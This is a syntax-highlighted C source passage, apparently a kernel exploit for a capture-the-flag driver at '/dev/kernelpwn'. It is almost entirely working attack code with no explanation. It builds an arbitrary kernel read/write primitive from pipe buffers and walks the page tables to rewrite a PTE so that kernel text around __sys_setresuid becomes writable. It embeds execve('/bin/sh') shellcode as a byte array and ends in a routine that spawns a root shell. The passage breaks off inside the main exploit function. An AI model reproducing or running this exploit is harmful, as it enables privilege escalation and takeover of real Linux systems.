</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">add</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">size</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">arg</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="n">size</span><span class="p">,</span><span class="n">buf</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x20</span><span class="p">,</span><span class="n">arg</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">add_only</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">size</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">arg</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="n">size</span><span class="p">,</span><span class="n">buf</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x77</span><span class="p">,</span><span class="n">arg</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">add_acc</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">size</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">arg</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="n">size</span><span class="p">,</span><span class="n">buf</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x88</span><span class="p">,</span><span class="n">arg</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">del</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">idx</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">arg</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="n">idx</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x30</span><span class="p">,</span><span class="n">arg</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">edit</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">idx</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span><span class="kt">uint64_t</span> <span class="n">size</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">arg</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="n">idx</span><span class="p">,</span><span class="n">size</span><span class="p">,</span><span class="n">buf</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x50</span><span class="p">,</span><span class="n">arg</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">show</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">idx</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span><span class="kt">uint64_t</span> <span class="n">size</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">arg</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="n">idx</span><span class="p">,</span><span class="n">size</span><span class="p">,</span><span class="n">buf</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x40</span><span class="p">,</span><span class="n">arg</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">list</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">idx</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span><span class="kt">uint64_t</span> <span class="n">size</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">arg</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="n">idx</span><span class="p">,</span><span class="n">size</span><span class="p">,</span><span class="n">buf</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x66</span><span class="p">,</span><span class="n">arg</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">page_fds</span><span class="p">[</span><span class="mh">0x1000</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">pipefd</span><span class="p">[</span><span class="mi">30</span><span class="p">][</span><span class="mi">2</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">spray_pags</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    <span class="nf">logd</span><span class="p">(</span><span class="s">&#34;Spray 0x10 order-0 page&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x20</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="n">page_fds</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nf">pagealloc_pad</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">determine_spray</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    <span class="nf">logd</span><span class="p">(</span><span class="s">&#34;spray determine page&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">spray_pags</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span> <span class="o">=</span> <span class="nf">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x20</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">alloc_pipe_buff</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// for(int i = 0; i &lt; 200; i++){
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//   if (socketpair(AF_UNIX, SOCK_STREAM, 0, ss [i]) &lt; 0) {
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//       perror(&#34;[-] socketpair&#34;);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//       return -1;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//   }
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// }
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">size_t</span> <span class="nf">get_skb_idx</span><span class="p">(</span><span class="kt">int</span> <span class="n">kid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="o">*</span><span class="n">leak</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">key</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="nf">get_key</span><span class="p">(</span><span class="n">kid</span><span class="p">,</span> <span class="mh">0xfff0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">leak</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)</span><span class="n">key</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0xfff0</span><span class="o">/</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">uint64_t</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0xDEADBEEEDEADBEEF</span><span class="p">){</span>   
</span></span><span class="line"><span class="cl">            <span class="kt">size_t</span> <span class="n">j</span> <span class="o">=</span> <span class="n">leak</span><span class="p">[</span><span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0xDEADBEEEDEADBEE0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="kt">size_t</span> <span class="n">tmp_i</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nf">logd</span><span class="p">(</span><span class="s">&#34;LEAK %d SKB[%d]&#34;</span><span class="p">,</span><span class="n">tmp_i</span><span class="p">,</span><span class="n">leak</span><span class="p">[</span><span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0xDEADBEEEDEADBEE0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">tmp_i</span><span class="p">,</span><span class="n">j</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">#define PTE_OFFSET 12
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PMD_OFFSET 21
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PUD_OFFSET 30
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PGD_OFFSET 39
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#define PT_ENTRY_MASK 0b111111111UL
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PTE_MASK (PT_ENTRY_MASK &lt;&lt; PTE_OFFSET)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PMD_MASK (PT_ENTRY_MASK &lt;&lt; PMD_OFFSET)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PUD_MASK (PT_ENTRY_MASK &lt;&lt; PUD_OFFSET)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PGD_MASK (PT_ENTRY_MASK &lt;&lt; PGD_OFFSET)
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#define PTE_ENTRY(addr) ((addr &gt;&gt; 12) &amp; PT_ENTRY_MASK)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PMD_ENTRY(addr) ((addr &gt;&gt; 21) &amp; PT_ENTRY_MASK)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PUD_ENTRY(addr) ((addr &gt;&gt; 30) &amp; PT_ENTRY_MASK)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PGD_ENTRY(addr) ((addr &gt;&gt; 39) &amp; PT_ENTRY_MASK)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PAGE_ENTRY(addr) ((addr) &amp; PT_ENTRY_MASK)
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#define PAGE_ATTR_RW (1UL &lt;&lt; 1)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PAGE_ATTR_NX (1UL &lt;&lt; 63)
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="k">const</span> <span class="kt">char</span> <span class="n">attack_data</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">106</span><span class="p">,</span> <span class="mi">104</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">184</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">98</span><span class="p">,</span> <span class="mi">105</span><span class="p">,</span> <span class="mi">110</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">115</span><span class="p">,</span> <span class="mi">80</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">137</span><span class="p">,</span> <span class="mi">231</span><span class="p">,</span> <span class="mi">104</span><span class="p">,</span> <span class="mi">114</span><span class="p">,</span> <span class="mi">105</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">129</span><span class="p">,</span> <span class="mi">52</span><span class="p">,</span> <span class="mi">36</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">246</span><span class="p">,</span> <span class="mi">86</span><span class="p">,</span> <span class="mi">106</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">94</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">230</span><span class="p">,</span> <span class="mi">86</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">137</span><span class="p">,</span> <span class="mi">230</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">210</span><span class="p">,</span> <span class="mi">106</span><span class="p">,</span> <span class="mi">59</span><span class="p">,</span> <span class="mi">88</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">5</span><span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">key_spray</span> <span class="o">=</span> <span class="mi">64</span><span class="o">*</span><span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">size_t</span> <span class="n">s2</span><span class="p">,</span><span class="n">tmp_idx</span><span class="p">,</span><span class="n">page_offset_base</span><span class="p">,</span><span class="n">vmemmap_base</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">uint64_t</span> <span class="nf">dirt</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//vir_addr =&gt; page_struct_addr
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">return</span> <span class="p">(((</span><span class="n">addr</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0xfff</span><span class="p">)</span> <span class="o">-</span> <span class="n">page_offset_base</span><span class="p">)</span> <span class="o">/</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="o">*</span> <span class="mh">0x40</span> <span class="o">+</span> <span class="n">vmemmap_base</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">arb_read</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">,</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="n">buf</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nf">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="sc">&#39;\x00&#39;</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">read</span><span class="p">(</span><span class="n">pipes</span><span class="p">[</span><span class="n">s2</span><span class="p">][</span><span class="mi">0</span><span class="p">],</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x200</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">addr</span><span class="p">;</span>  
</span></span><span class="line"><span class="cl">    <span class="n">buf</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x000011ff00000000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">write</span><span class="p">(</span><span class="n">pipes</span><span class="p">[</span><span class="n">s2</span><span class="p">][</span><span class="mi">1</span><span class="p">],</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="sc">&#39;\x00&#39;</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">read</span><span class="p">(</span><span class="n">pipes</span><span class="p">[</span><span class="n">tmp_idx</span><span class="p">][</span><span class="mi">0</span><span class="p">],</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">arb_write</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">,</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="n">write_data</span><span class="p">,</span><span class="kt">uint64_t</span> <span class="n">size</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span> <span class="o">=</span> <span class="nf">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x4000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="o">*</span><span class="n">data</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">memset</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="sc">&#39;\x00&#39;</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">read</span><span class="p">(</span><span class="n">pipes</span><span class="p">[</span><span class="n">s2</span><span class="p">][</span><span class="mi">0</span><span class="p">],</span><span class="n">data</span><span class="p">,</span><span class="mh">0x200</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">addr</span><span class="p">;</span>  
</span></span><span class="line"><span class="cl">    <span class="c1">//offset &amp;&amp; length == 0
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0000000000000000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">write</span><span class="p">(</span><span class="n">pipes</span><span class="p">[</span><span class="n">s2</span><span class="p">][</span><span class="mi">1</span><span class="p">],</span><span class="n">data</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">write</span><span class="p">(</span><span class="n">pipes</span><span class="p">[</span><span class="n">tmp_idx</span><span class="p">][</span><span class="mi">1</span><span class="p">],</span><span class="n">write_data</span><span class="p">,</span><span class="n">size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">get_addr</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">pgd_addr</span><span class="p">,</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">pte_addr</span><span class="p">,</span><span class="n">pud_addr</span><span class="p">,</span><span class="n">pmd_addr</span><span class="p">,</span><span class="n">page_addr</span><span class="p">,</span><span class="n">dst_addr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="o">*</span><span class="n">data</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">dst_addr</span> <span class="o">=</span> <span class="n">addr</span><span class="p">;</span><span class="c1">// __sys_setresuid
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">arb_read</span><span class="p">(</span><span class="nf">dirt</span><span class="p">(</span><span class="n">pgd_addr</span><span class="p">),</span><span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">pud_addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="nf">PGD_ENTRY</span><span class="p">(</span><span class="n">dst_addr</span><span class="p">)]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="mh">0xfff</span><span class="p">))</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="n">PAGE_ATTR_NX</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">pud_addr</span> <span class="o">+=</span> <span class="n">page_offset_base</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">arb_read</span><span class="p">(</span><span class="nf">dirt</span><span class="p">(</span><span class="n">pud_addr</span><span class="p">),</span><span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">pmd_addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="nf">PUD_ENTRY</span><span class="p">(</span><span class="n">dst_addr</span><span class="p">)]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="mh">0xfff</span><span class="p">))</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="n">PAGE_ATTR_NX</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">pmd_addr</span> <span class="o">+=</span> <span class="n">page_offset_base</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">arb_read</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span> <span class="nf">dirt</span><span class="p">(</span><span class="n">pmd_addr</span><span class="p">),</span> <span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">pte_addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="nf">PMD_ENTRY</span><span class="p">(</span><span class="n">dst_addr</span><span class="p">)]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="mh">0xfff</span><span class="p">))</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="n">PAGE_ATTR_NX</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">page_addr</span> <span class="o">=</span> <span class="n">pte_addr</span> <span class="o">+</span> <span class="mh">0x1000</span> <span class="o">*</span> <span class="nf">PTE_ENTRY</span><span class="p">(</span><span class="n">dst_addr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">pte_addr</span> <span class="o">+=</span> <span class="n">page_offset_base</span><span class="p">;</span><span class="c1">//==kernel_base ; + 0xeab50 == __sys_setre
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">arb_read</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span> <span class="nf">dirt</span><span class="p">(</span><span class="n">pte_addr</span><span class="p">),</span> <span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">page_addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="nf">PTE_ENTRY</span><span class="p">(</span><span class="n">dst_addr</span><span class="p">)]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="mh">0xfff</span><span class="p">))</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="n">PAGE_ATTR_NX</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">page_addr</span> <span class="o">+=</span> <span class="n">page_offset_base</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span><span class="p">[</span><span class="nf">PTE_ENTRY</span><span class="p">(</span><span class="n">dst_addr</span><span class="p">)]</span> <span class="o">=</span> <span class="mh">0x1fc000</span> <span class="o">|</span> <span class="mh">0x8000000000000867</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">arb_write</span><span class="p">(</span><span class="nf">dirt</span><span class="p">(</span><span class="n">pte_addr</span><span class="p">),</span><span class="n">data</span><span class="p">,</span><span class="mh">0xff0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">get_root_shell</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nf">getuid</span><span class="p">())</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\033</span><span class="s">[31m</span><span class="se">\033</span><span class="s">[1m[x] Failed to get the root!</span><span class="se">\033</span><span class="s">[0m&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\033</span><span class="s">[32m</span><span class="se">\033</span><span class="s">[1m[+] Successful to get the root. </span><span class="se">\033</span><span class="s">[0m&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\033</span><span class="s">[34m</span><span class="se">\033</span><span class="s">[1m[*] Execve root shell now...</span><span class="se">\033</span><span class="s">[0m&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nf">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="cm">/* to exit the process normally, instead of segmentation fault */</span>
</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="n">EXIT_SUCCESS</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">exp</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    <span class="nf">set_cpu_affinity</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">init_namespace</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="n">fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/dev/kernelpwn&#34;</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;open&#34;</span><span class="p">);</span>
